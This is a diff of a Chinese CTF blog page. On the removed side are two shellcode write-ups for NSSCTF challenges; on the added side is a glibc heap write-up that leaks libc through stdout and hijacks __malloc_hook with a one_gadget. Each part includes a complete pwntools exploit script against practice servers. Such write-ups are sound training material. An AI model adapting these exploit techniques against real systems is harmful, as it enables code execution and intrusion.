@@ -5,7 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	<meta name="description" content="">
 	<meta name="keywords" content="">
-	<title>shellcode - My Blog</title>
+	<title>_IO_FILEt - My Blog</title>
     <link rel="alternate" href="" type="application/atom+xml"/>
 	<link rel="shortcut icon" href=""/>
 	
@@ -62,7 +62,7 @@
 </header>
 
         <div class="column-title fadeToTop">
-    <h3><span class="title-info">标签</span> shellcode</h3>
+    <h3><span class="title-info">标签</span> _IO_FILEt</h3>
 </div>
 
 <div class="con-wrap fadeToTop">
@@ -74,8 +74,8 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
-                <a href="/2025/04/20/ORW2/" title="ORW2">
-                    ORW2
+                <a href="/2025/04/23/2021-长城杯-院校组-K1ng-in-h3ap-I-stdout泄露libc初探/" title="[2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探">
+                    [2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探
                 </a>
             </h2>
         
@@ -83,7 +83,7 @@
         <ul class="article-extra" style="margin-bottom: 20px">
             
             <li class="article-time">
-                2025-04-20
+                2025-04-23
             </li>
             
 
@@ -95,23 +95,23 @@
         </ul>
         <div class="article-description">
             
-            <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3722">[GDOUCTF 2023]Random</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>随机数直接爆破，然后有个call rsi<br>栈底是rsi </p>
-<pre><code class="hljs as">  .text:<span class="hljs-number">0000000000400931</span>                 lea     rax, [rbp+buf]
-.text:<span class="hljs-number">0000000000400935</span>                 mov     edx, <span class="hljs-number">40</span>h ; <span class="hljs-string">&#x27;@&#x27;</span>  ; nbytes
-.text:<span class="hljs-number">000000000040093</span>A                 mov     rsi, rax        ; buf</code></pre>
-<p>我们直接在栈写payload<br>调用syscall read 读入bss<br>读进bss的就是我们的orw payload<br>完事了继续call 可以调用栈上的 或者汇编写应该都可以</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+            <p>题目存在UAF OFF-BY-ONE</p>
+<p>通过申请0x*8 的chunk 可以覆盖到size 位 </p>
+<p>所以可以让不属于unsortbin 的chunk free到unsortbin里面去</p>
+<p>然后再free一个chunk造成同时存在于unsortbin fastbin</p>
+<p>然后通过拿到_IO_2_1_STDOUT的控制权 覆盖_io_write_ptr指针</p>
+<p>让他打印一些地址 然后就可以拿到libc_base </p>
+<p>同时学到了 ogg 如果堆栈不平衡 可以写到_realloc_hook </p>
+<p>然后__malloc_hook写realloc就平衡了</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
 <span class="hljs-comment">#from LibcSearcher import *</span>
 context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
 context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
-io = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">29191</span>)
-<span class="hljs-comment">#io = process(&quot;./RANDOM&quot;)</span>
-e = ELF(<span class="hljs-string">&#x27;./RANDOM&#x27;</span>)
-<span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;)</span>
+io = remote(<span class="hljs-string">&quot;node7.anna.nssctf.cn&quot;</span>,<span class="hljs-number">29639</span>)
+<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)
 
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
 	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
@@ -129,139 +129,62 @@ itr     = <span class="hljs-keyword">lambda</span>                    :io.intera
 uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
 uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
 ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))
 
-call_rsi = <span class="hljs-number">0x400c23</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))    
 
-bss = <span class="hljs-number">0x6010b0</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
-      sla(<span class="hljs-string">b&quot;num:&quot;</span>,<span class="hljs-built_in">str</span>(i))
-      io.recvline()
-      msg = io.recvline()
-      ls(msg)
-      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;no&quot;</span> <span class="hljs-keyword">in</span> msg:
-            <span class="hljs-keyword">pass</span>
-      <span class="hljs-keyword">else</span>:
-            ls(<span class="hljs-string">&quot;success get num&quot;</span>)
-            <span class="hljs-keyword">break</span>
-      
-code = <span class="hljs-string">&quot;&quot;&quot;</span>
-<span class="hljs-string">        xor rax,rax</span>
-<span class="hljs-string">        mov rdi,0</span>
-<span class="hljs-string">        mov rsi,0x6010b0</span>
-<span class="hljs-string">        mov rdx,0xFFFF</span>
-<span class="hljs-string">        syscall</span>
-<span class="hljs-string">        call rsi</span>
-<span class="hljs-string">        &quot;&quot;&quot;</span>
-      
-asm_code = asm(code).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;context:&quot;</span>,content)
 
-payload = asm_code + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> +p64(call_rsi)
-ls(<span class="hljs-string">&quot;asm_code=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(asm_code)))
-<span class="hljs-comment">#bug()</span>
-sla(<span class="hljs-string">&quot;your door&quot;</span>,payload)
-
-code1 = shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)
-payload1 = asm(code1)
-s(payload1)
-
-
-
-io.interactive()</code></pre>
-
-
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
-<li>对该题的考点总结</li>
-</ul>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/20/简单ORW初探/" title="简单ORW初探">
-                    简单ORW初探
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-20
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3488">[HGAME 2023 week1]simple_shellcode</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目提示重读 gdb动调 发现rdi有值<br>清空 rdx是0xcafe0000 直接转移<br>rdx也是读取字节 这里设置这么大无伤大雅 懒得改 直接syscall<br>然后根据之前的payload大小生成垃圾字符 后面跟shellcode 这样执行完刚好到我们shellcode<br>直接输出flag</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
-<span class="hljs-comment">#from LibcSearcher import *</span>
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
-io = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">24834</span>)
-<span class="hljs-comment">#io = process(&quot;./vuln&quot;)</span>
-e = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)
-libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
-	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
-    attach(io)
-
-s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
-sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
-sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
-sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
-r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
-ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
-itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
-uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
-
-
-code = <span class="hljs-string">&quot;&quot;&quot;</span>
-<span class="hljs-string">xor rdi,rdi</span>
-<span class="hljs-string">mov rsi,rdx</span>
-<span class="hljs-string">syscall</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">&quot;&quot;&quot;</span>
-payload = asm(code) 
-ls(<span class="hljs-string">&quot;shellcode byte=&gt;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))
-<span class="hljs-comment">#bug()</span>
-sa(<span class="hljs-string">b&quot;shellcode&quot;</span>,payload)
-payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-built_in">len</span>(payload) + asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))
-s(payload1)
+sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">666</span>))
+ru(<span class="hljs-string">b&quot;\n&quot;</span>)
+offset = libc.sym[<span class="hljs-string">&quot;printf&quot;</span>] - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]
+leak_printf_low_addr = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">b&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)
+stdout_addr_offset = <span class="hljs-built_in">hex</span>(leak_printf_low_addr - offset -<span class="hljs-number">0x43</span>)[<span class="hljs-number">2</span>:]
+add(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>)
+add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)
+add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>)
+add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">&#x27;\xb1&#x27;</span>)
+delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#进入unsortbin</span>
+delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#进入fastbin 但是前面有进unsortbin的 所以合并 造成重叠</span>
+add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)
+byte_data = <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(stdout_addr_offset[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(stdout_addr_offset)-<span class="hljs-number">2</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">2</span>)])
+edit(<span class="hljs-number">2</span>,byte_data)
+add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)
+add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>) <span class="hljs-comment">#get stdout - 0x43</span>
+edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span>+p64(<span class="hljs-number">0xfbad1877</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x50&#x27;</span>)
+leak_stdout_131 = uu64(ru(<span class="hljs-string">b&quot;1. add&quot;</span>)[<span class="hljs-number">1</span>:<span class="hljs-number">7</span>]) <span class="hljs-comment">#&lt;_IO_2_1_stdout_+131</span>
+dlog(<span class="hljs-string">&quot;leak_stdout_131&quot;</span>,leak_stdout_131)
+libc_base = leak_stdout_131 - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="hljs-number">131</span>
+dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
+og = [<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]
+ogg = libc_base + og[<span class="hljs-number">0</span>]
+malloc_hook_fake_fastbin = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] -<span class="hljs-number">0x23</span>
+dlog(<span class="hljs-string">&quot;malloc_hook_fake_fastbin&quot;</span>,malloc_hook_fake_fastbin)
+add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>)
+delete(<span class="hljs-number">6</span>)
+edit(<span class="hljs-number">6</span>,p64(malloc_hook_fake_fastbin))
+add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>)
+add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>) <span class="hljs-comment">#get __malloc_hook fake fastbin</span>
+edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">11</span>+p64(ogg)+p64(libc_base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]+<span class="hljs-number">13</span>))
+<span class="hljs-comment">#通过把one_gadget 写到 realloc_hook 然后malloc_hook 写realloc 来达到栈平衡</span>
+add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)
 
 
 io.interactive()</code></pre>
 
-
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
-<li>对该题的考点总结</li>
-</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/123042819">https://blog.csdn.net/Invin_cible/article/details/123042819</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/120386179">https://blog.csdn.net/yongbaoii/article/details/120386179</a></p>
 
         </div>
         
